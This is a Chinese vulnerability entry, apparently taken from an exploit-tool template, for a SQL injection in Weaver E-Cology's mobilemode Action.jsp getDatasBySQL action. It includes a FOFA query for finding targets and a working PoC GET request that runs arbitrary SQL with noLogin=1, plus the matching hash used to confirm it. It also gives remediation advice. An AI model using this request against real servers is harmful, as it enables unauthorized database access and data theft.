---
cve: ""
fofa: "app=\"泛微-协同办公OA\""
version: "未知"
source: "https://github.com/LittleBear4/OA-EXPTOOL/blob/e2beff80059570bf58292d052d97a497749d87ea/book/weaver/ecologye-mobilemodeAction-sql%E6%B3%A8%E5%85%A5.yaml"
---

# 泛微E-Cology mobilemode Action.jsp SQL注入漏洞

## 漏洞描述

公开模板记录 E-Cology 移动建模入口通过 `MECAdminAction` 的 `getDatasBySQL` 动作执行传入 SQL。缺少适当权限约束时，数据库查询能力可能暴露给调用者。

## 影响范围与前提

来源正文标注 E-Cology 8，其他元数据存在 E-Office 混写，因此完整受影响范围未知。以下请求采用 SQL Server 函数；`noLogin=1` 是公开请求参数，不是所有部署均无需认证的证明。

## 公开验证资料

下列请求忠实保留上游类名与 SQL 参数，并对 URL 中空格编码：

```http
GET /mobilemode/Action.jsp?invoker=com.weaver.formmodel.mobile.mec.servlet.MECAdminAction&action=getDatasBySQL&datasource=&sql=select%20sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456'))&noLogin=1 HTTP/1.1
Host: oa.example.com
```

上游以 `0xe10adc3949` 摘要前缀匹配。人工确认应核对完整计算值 `0xe10adc3949ba59abbe56e057f20f883e` 及其结果上下文，并与正常请求对照；不能凭 HTTP 200 或报错页判断。

## 修复建议

向厂商核对当前版本和对应安全更新；在修复前限制该接口的访问，并检查相关访问日志。

## 参考来源

- [公开资料 1](https://github.com/LittleBear4/OA-EXPTOOL/blob/e2beff80059570bf58292d052d97a497749d87ea/book/weaver/ecologye-mobilemodeAction-sql%E6%B3%A8%E5%85%A5.yaml)

来源已于 2026-10-02 静态核对；本文未在目标环境执行请求，公开 PoC 不代表本地复现通过。
